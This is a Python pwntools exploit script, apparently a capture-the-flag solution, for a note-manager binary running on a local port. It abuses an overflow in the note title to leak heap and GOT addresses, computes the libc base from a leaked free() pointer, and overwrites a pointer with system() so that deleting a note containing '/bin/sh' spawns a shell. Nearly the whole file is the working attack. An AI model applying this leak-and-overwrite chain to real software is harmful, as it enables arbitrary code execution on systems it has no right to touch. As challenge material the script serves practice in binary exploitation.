from pwn import *

#p = process("./main")
#p = gdb.debug("./main", gdbscript="""
#    b * vuln
#    b * note_delete
#    c
#""")
p = remote("127.0.0.1", 1337)

def note_new(title, content, title_len=None, content_len=None):
    if title_len is None:
        title_len = len(title)+1
    if content_len is None:
        content_len = len(content)+1

    p.recvuntil(b"> ")
    p.sendline(b"0")
    p.recvuntil(b"length: ")
    p.sendline(str(title_len).encode())
    p.recvuntil(b"title: ")
    p.send(title)
    p.recvuntil(b"length: ")
    p.sendline(str(content_len).encode())
    p.recvuntil(b"content: ")
    p.send(content)

def note_list():
    p.recvuntil(b"> ")
    p.sendline(b"1")
    notes = []
    while True:
        line = p.recvline().strip()
        if b"0. Create note" in line:
            break
        notes.append(line)
    return notes

def note_select(index):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.sendline(str(index).encode())

def note_print():
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b"Title: ")
    title = p.recvline().strip()
    p.recvuntil(b"Content: ")
    content = p.recvline().strip()
    return title, content

def note_resize(new_title_len, new_content_len):
    p.recvuntil(b"> ")
    p.sendline(b"4")
    p.sendline(str(new_title_len).encode())
    if new_content_len is not None:
        p.sendline(str(new_content_len).encode())

def note_edit_title(title):
    p.recvuntil(b"> ")
    p.sendline(b"5")
    p.sendline(b"1")
    p.recvuntil(b"title: ")
    p.send(title)

def note_edit_content(content):
    p.recvuntil(b"> ")
    p.sendline(b"5")
    p.sendline(b"2")
    p.recvuntil(b"content: ")
    p.send(content)

def note_delete():
    p.recvuntil(b"> ")
    p.sendline(b"6")

for i in range(10):
    note_new(b"A"*8, b"/bin/sh\x00")
note_select(9)
note_delete()
note_new(b"A"*8, b"B"*8)
note_resize(0x100, None)
note_edit_title(b"A"*64 + b"\x01\x02\x03\04\x05\x06\x07\x08\x09\x0a\x0b\x0c")
leak = note_list()[-1]
print(f"Leaked note: {leak}")
leak = u64(leak.ljust(8, b"\x00"))
print(f"Leaked address: {hex(leak)}")
got = leak - 0x390
print(f"Leaked GOT address: {hex(got)}")

note_edit_title(b"A"*64 + b"\x01\x02\x03\x04" + p64(got))
_, content = note_print()
print(f"Leaked content: {content}")
leak = u64(content.ljust(8, b"\x00"))
print(f"Leaked free: {hex(leak)}")
#libc_base = leak - 0xa8bd0
libc_base = leak - 0xb5660
print(f"Leaked libc base: {hex(libc_base)}")
#system = libc_base + 0x54580
system = libc_base + 0x5c560
print(f"Leaked system: {hex(system)}")

note_edit_content(p64(system))
note_select(0)
note_delete()

p.interactive()
